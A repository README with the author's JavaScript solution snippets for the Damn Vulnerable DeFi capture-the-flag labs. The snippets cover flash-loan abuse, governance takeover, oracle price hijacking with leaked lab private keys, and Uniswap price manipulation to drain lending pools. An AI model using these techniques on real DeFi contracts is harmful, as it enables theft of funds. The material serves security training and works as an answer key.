# DVD Solutions
## Introduction
This repository contains my solutions to [Damn Vulnerable Defi](https://www.damnvulnerabledefi.xyz) labs.  As javascript required for interaction with hardhat is just a couple lines of code, so it is provided in snippets below. 
## JS Snippets
### [Unstoppable](https://www.damnvulnerabledefi.xyz/challenges/1.html)
``` JavaScript
await this.token.connect(attacker).transfer(this.pool.address, 1);
// Now pool balance is different than saved in contract which fails defined requirement.
```
### [Naive receiver](https://www.damnvulnerabledefi.xyz/challenges/2.html)
``` JS
const ReceiverExploitFactory = await ethers.getContractFactory('ReceiverExploit', attacker);

await ReceiverExploitFactory.deploy(this.receiver.address, this.pool.address);
```
### [Truster](https://www.damnvulnerabledefi.xyz/challenges/3.html)
``` JS
const TrusterExploitFactory = await ethers.getContractFactory('TrusterExploit', attacker);

await TrusterExploitFactory.deploy(this.pool.address, this.token.address, ethers.utils.parseEther('1000000'));
```

### [Side entrance](https://www.damnvulnerabledefi.xyz/challenges/4.html)
``` JS
// Deploy and have fun!

const SideExploitFactory = await ethers.getContractFactory('SideExploit', attacker);

let sideExploit = await SideExploitFactory.deploy(this.pool.address, ethers.utils.parseEther('1000'));

await sideExploit.exploit();
```

### [The rewarder](https://www.damnvulnerabledefi.xyz/challenges/5.html)
```JS
// Deploy contract

const RewarderExploitFactory = await ethers.getContractFactory('RewarderExploit', attacker);

let RewarderExploit = await RewarderExploitFactory.deploy(this.rewarderPool.address,

this.flashLoanPool.address,

this.liquidityToken.address,

this.rewardToken.address);

// Wait 5 days

await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60 + 7]);

// Go nuts :)

await RewarderExploit.exploit();
```

### [Selfie](https://www.damnvulnerabledefi.xyz/challenges/6.html)
``` JS
// Deploy & exploit

const SelfieExploitFactory = await ethers.getContractFactory('SelfieExploit', attacker);

let SelfieExploit = await SelfieExploitFactory.deploy(
	this.pool.address,
	this.governance.address,
	this.token.address
);

await SelfieExploit.exploit();

// Wait 2 days

await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60 + 7]);

// Reward :)

await this.governance.connect(attacker).executeAction(SelfieExploit.evilActionId());
```

### [Compromised](https://www.damnvulnerabledefi.xyz/challenges/7.html)
``` JS
const oracleMajority = [
	new ethers.Wallet(
		'0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
		ethers.provider),
	new ethers.Wallet(
		'0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48',
		ethers.provider)
];

// Hijack consenssus and set arbitrary price
const setNewPrice = async (newPrice) => {
	for(const source of oracleMajority)
		await this.oracle.connect(source).postPrice("DVNFT", newPrice);
}

// Get one for free :)
await setNewPrice(0);
const purchaseTx = await this.exchange.connect(attacker).buyOne({value:1337});

// Get full transaction info, extract tokenId from emitted event
const purchaseTxReceipt = await purchaseTx.wait();
const tokenId = purchaseTxReceipt.events[1].args[1];

// Approve NFT transfer to facilitate sale
await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);

// Sell at price of exchange balance
await setNewPrice(await ethers.provider.getBalance(this.exchange.address));
await this.exchange.connect(attacker).sellOne(tokenId);

// Cover the tracks by setting price to initial value
await setNewPrice(INITIAL_NFT_PRICE);
```

### [Puppet](https://www.damnvulnerabledefi.xyz/challenges/8.html)
``` JS
// Calculations are perfomed off-chain to avoid costs and trail in blockchain

// Helper function for calls to contract
let priceForNTokens = async n => await this.uniswapExchange.getTokenToEthInputPrice(
	ethers.utils.parseEther(''+n),
	{ gasLimit: 1e6 }
);

// For calculations tokens are provided in 1 ether = 10**18 wei
const poolTokensInEth = POOL_INITIAL_TOKEN_BALANCE/10**18;

// Calculation of collateral after tokens dump to exchange
let calculatePoolCollateral = (dumpedTokensInEth, tokensValue) =>
(UNISWAP_INITIAL_ETH_RESERVE-tokensValue)/dumpedTokensInEth*poolTokensInEth*2; // wei / eth * wei = wei

// Variables definition
let dumpTokens;
let collateral = ATTACKER_INITIAL_ETH_BALANCE;
let tokensValue;

// Estimating optimal amount of tokens to dump, purpose is maximal possible token ownership
for(dumpTokens=1;collateral>=ATTACKER_INITIAL_ETH_BALANCE;dumpTokens++){
	tokensValue = await priceForNTokens(dumpTokens);
	collateral = calculatePoolCollateral(dumpTokens, tokensValue);
}

let dumpTokensWei = ethers.utils.parseEther(dumpTokens+1+"")

// Performing transactions - they could be performed as one in contract constructor
await this.token.connect(attacker).approve(
	this.uniswapExchange.address,
	dumpTokensWei);

// Dumping tokens
collateral = BigInt(collateral); // necessary to avoid overflow on 3rd tx

await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
	dumpTokensWei,
	tokensValue,
	Date.now() + 3600000// 1 hour from now
);

// Borrow all tokens
await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,{value:collateral});
```
### [Puppet v2](https://www.damnvulnerabledefi.xyz/challenges/9.html)
``` JS
let attacker99Percent = async () => (await ethers.provider.getBalance(attacker.address)).toBigInt() / 100n * 99n;
// Approve transfer
await this.token.connect(attacker).approve(
	this.uniswapRouter.address,
	await this.token.balanceOf(attacker.address)
)

//Dump all tokens in exchange
await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
	ATTACKER_INITIAL_TOKEN_BALANCE,
	1337,
	[
		this.token.address,
		this.weth.address
	],
	attacker.address,
	Date.now() + 3600000
);

//Convert majority of funds to WETH
await this.weth.connect(attacker).deposit({value: await attacker99Percent()});

//Approve colaterral transfer
await this.weth.connect(attacker).approve(
	this.lendingPool.address,
	this.weth.balanceOf(attacker.address)
);

//Borrow all tokens
await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
```

### [Free rider](https://www.damnvulnerabledefi.xyz/challenges/10.html)
``` JS
const FreeRiderExploitFactory = await ethers.getContractFactory('FreeRiderExploit', attacker);

let FreeRiderExploit = await FreeRiderExploitFactory.deploy(
	this.uniswapPair.address,
	this.marketplace.address,
	this.weth.address,
	this.nft.address,
	this.buyerContract.address
);

let tx = await FreeRiderExploit.connect(attacker).exploit(
	[0, 1, 2, 3, 4, 5],
	ethers.utils.parseEther('15'),
	{value:ethers.utils.parseEther('0.3')}
);

await tx.wait();
```

### [Backdoor](https://www.damnvulnerabledefi.xyz/challenges/11.html)
``` JS
await (await (await ethers.getContractFactory('BackdoorExploit', attacker)).deploy(
	this.token.address,
	this.walletFactory.address
)).exploit(
	users,
	this.masterCopy.address,
	this.walletRegistry.address
)
```

### [Climber](https://www.damnvulnerabledefi.xyz/challenges/12.html)
``` JS
await (await (await ethers.getContractFactory('ClimberExploit', attacker)).deploy()).exploit(
	this.token.address,
	this.timelock.address,
	this.vault.address
)
```
